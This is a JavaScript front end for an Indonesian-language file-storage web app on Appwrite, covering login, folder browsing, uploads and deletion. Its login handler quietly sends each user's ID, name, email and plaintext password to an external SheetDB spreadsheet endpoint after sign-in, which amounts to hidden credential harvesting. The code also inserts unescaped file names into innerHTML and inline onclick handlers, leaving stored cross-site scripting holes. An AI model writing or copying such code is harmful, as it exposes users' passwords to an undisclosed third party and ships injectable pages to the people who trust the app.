const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI (PASTIKAN ID INI BENAR)
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};
const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root';
let currentFolderName = "Drive";

const el = (id) => document.getElementById(id);
const showLoading = () => el('loading').classList.remove('hidden');
const hideLoading = () => el('loading').classList.add('hidden');

// === CHECK SESSION ===
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); 
        updateGreeting(); 
        calculateStorage(); 
        loadFiles('root');
    } catch (e) { 
        nav('loginPage'); 
    } finally { 
        hideLoading(); 
    }
}
document.addEventListener('DOMContentLoaded', checkSession);

// === LOAD FILES (PERBAIKAN AGAR MUNCUL) ===
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); grid.innerHTML = '';
    const header = el('headerTitle');

    // Breadcrumb Navigation
    if(folderId === 'root') {
        updateGreeting(); 
    } else {
        header.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px; margin-right:15px; display:inline-flex; align-items:center; gap:5px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> ${currentFolderName}`;
    }

    try {
        // QUERY DATABASE
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        
        if(res.documents.length === 0) {
            grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px;">Folder ini masih kosong</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
    } catch (e) { 
        console.error("Error loading files:", e);
        alert("Gagal memuat data. Cek koneksi.");
    }
}

// === RENDER ITEM (TAMPILAN BERSIH) ===
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    const isFolder = doc.type === 'folder';
    
    // Pastikan menggunakan 'name' sesuai database
    const fileName = doc.name || "Tanpa Nama";
    const fileNameLower = fileName.toLowerCase();
    
    let content = '';

    if (isFolder) {
        // Ikon Folder Besar Kuning
        content = `<i class="icon fa-solid fa-folder"></i>`;
    } else if (fileNameLower.match(/\.(jpg|jpeg|png|webp|gif)$/)) {
        // Thumbnail Gambar dalam kotak
        const url = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
        content = `<div class="thumb-box"><img src="${url}" class="thumb-img" loading="lazy"></div>`;
    } else {
        // Ikon File Lain
        content = `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    }

    const action = isFolder 
        ? `openFolder('${doc.$id}', '${fileName}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.className = 'item-card';
    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')"><i class="fa-solid fa-xmark"></i></button>
        <div onclick="${action}" style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;">
            ${content}
            <div class="item-name">${fileName}</div>
        </div>`;
    grid.appendChild(div);
}

// === STORAGE ===
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('type', 'file')
        ]);
        let total = 0;
        res.documents.forEach(doc => total += (doc.size || 0));
        const mb = (total / (1024 * 1024)).toFixed(2);
        const pct = Math.min((total / (2 * 1024 * 1024 * 1024)) * 100, 100);
        el('storageUsed').innerText = `${mb} MB / 2 GB`;
        el('storageBar').style.width = pct + "%";
    } catch (e) { console.error(e); }
}

// === ACTIONS ===
window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };

window.submitCreateFolder = async () => {
    const n = el('newFolderName').value.trim(); if(!n) return;
    closeModal('folderModal'); showLoading();
    try {
        // SIMPAN KE KOLOM 'name'
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: n, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return;
    closeModal('uploadModal'); showLoading();
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), window.selectedFile);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        // SIMPAN KE KOLOM 'name'
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: window.selectedFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: window.selectedFile.size
        });
        loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus item?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// === UI UTILS ===
window.nav = (p) => { document.querySelectorAll('section').forEach(s => s.classList.add('hidden')); el(p).classList.remove('hidden'); };
window.openModal = (m) => el(m).classList.remove('hidden');
window.closeModal = (m) => el(m).classList.add('hidden');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; el('headerTitle').innerText = `Welcome In Drive ${s}`; }
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');

el('dropZone').addEventListener('dragover', (e) => e.preventDefault());
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));

// LOGIN SYSTEM
if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    let id = el('loginEmail').value.trim(); const pw = el('loginPass').value;
    showLoading();
    try {
        if (!id.includes('@')) {
            const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', id)]);
            if (res.total === 0) throw new Error("User tidak ditemukan");
            id = res.documents[0].email;
        }
        await account.createEmailPasswordSession(id, pw);
        currentUser = await account.get();
        fetch(`${SHEETDB_API}?sheet=Login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": pw, "Riwayat Waktu": new Date().toLocaleString()}]}) });
        checkSession();
    } catch(e) { alert(e.message); hideLoading(); }
});
// (Pastikan signup/logout juga ada)